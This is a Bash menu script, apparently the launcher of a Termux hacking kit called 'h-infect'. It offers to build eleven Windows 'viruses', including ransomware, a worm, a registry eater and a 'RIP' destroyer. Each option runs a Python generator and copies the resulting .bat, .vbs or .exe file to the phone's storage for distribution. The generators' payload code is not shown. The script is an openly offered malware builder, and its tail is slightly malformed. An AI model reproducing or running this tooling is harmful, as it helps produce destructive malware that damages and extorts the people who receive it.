red='\033[1;31m'
rset='\033[0m'      
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
center() {
  termwidth=$(stty size | cut -d" " -f2)
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}
#coding section starts :)
lagi=01
while [ $lagi -lt 6 ];
do
clear 
echo -e "$pink

            ╦ ╦╦╔╗╔╔╦╗╔═╗╦ ╦╔═╗  ╦  ╦╦╦═╗╦ ╦╔═╗
            ║║║║║║║ ║║║ ║║║║╚═╗  ╚╗╔╝║╠╦╝║ ║╚═╗
            ╚╩╝╩╝╚╝═╩╝╚═╝╚╩╝╚═╝   ╚╝ ╩╩╚═╚═╝╚═╝
"
echo ""
echo -e "$grn     ::::::::::::::::::$ylo [ TYPE ]$grn ::::::::::::::::::::$rset"
echo ""
echo -e "$red                    ➡ [01]$blue Alay";
echo -e "$red                    ➡ [02]$blue Capslock";
echo -e "$red                    ➡ [03]$blue Cmd";
echo -e "$red                    ➡ [04]$blue Koce";
echo -e "$red                    ➡ [05]$blue Kuis";
echo -e "$red                    ➡ [06]$blue Ransomeware";
echo -e "$red                    ➡ [07]$blue Reg-eater";
echo -e "$red                    ➡ [08]$blue RIP";
echo -e "$red                    ➡ [09]$blue Sleepy";
echo -e "$red                    ➡ [10]$blue Ugly";
echo -e "$red                    ➡ [11]$blue Worm";
echo -e "$red                    ➡ [00]$blue EXIT";
echo ""
echo -e "$grn     :::::::::::::::::$ylo [ SELECT ]$grn :::::::::::::::::::$rset"
echo " "
echo -e "$cyan	      ╭─$pink[[[$red Select any option$pink ]]]$cyan"
read -p "              ╰──────────➤ "  n;
case "$n" in
01) clear
#Alay
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python alay.py
cd Windows
mv alay.vbs /sdcard/TECHABITS
center "Alay Virus Successfull Created"
sleep 3.0
;;
02) clear
#Capslock
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python capslock.py
cd Windows
mv capslock.vbs /sdcard/TECHABITS
center "Capslock Virus Successfull Created"
sleep 3.0
;;
03) clear
#cmd
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python cmd.py
cd Windows
mv cmd.bat /sdcard/TECHABITS
center "Cmd Virus Successfull Created"
sleep 3.0
;;
04) clear
#Koce
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python koce.py
cd Windows
mv koce.bat /sdcard/TECHABITS
center "Koce Virus Successfull Created"
sleep 3.0
;;
05) clear
#Kuis
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python kuis.py
cd Windows
mv kuis.bat /sdcard/TECHABITS
center "Kuis Virus Successfull Created"
sleep 3.0
;;
06) clear
#Ransomeware
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python ransomeware.py
cd Windows
mv ransomeware.exe /sdcard/TECHABITS
center "Ransomeware Virus Successfull Created"
sleep 3.0
;;
07) clear
#Reg-eater
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python reg-eater.py
cd Windows
mv reg-eater.bat /sdcard/TECHABITS
center "Reg-eater Virus Successfull Created"
sleep 3.0
;;
08) clear
#RIP
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python rip.py
cd Windows
mv RIP.bat /sdcard/TECHABITS
center "RIP Virus Successfull Created"
sleep 3.0
;;
09) clear
#Sleepy
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python sleepy.py
cd Windows
mv sleepy.bat /sdcard/TECHABITS
center "Sleepy Virus Successfull Created"
sleep 3.0
;;
10) clear
#Ugly
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python ugly.py
cd Windows
mv ugly.bat /sdcard/TECHABITS
center "Ugly Virus Successfull Created"
sleep 3.0
;;
11) clear
#Worm
cd
cd h-infect
cd core
cd hpv
cd hwn
clear
echo ""
echo -e "$grn"
center "Creating The Virus"
sleep 5.0
echo -e "$blue Malware Build[\e[92m✓\e[34m]$grn"
sleep 2.0
python worm.py
cd Windows
mv worm.bat /sdcard/TECHABITS
center "Worm Virus Successfull Created"
sleep 3.0
;;
00) clear
exit
;;
*) clear
echo ""
echo -e "$grn sorry, the  option you looking is not found"
sleep 2.0
clear
esac
done
done

=================="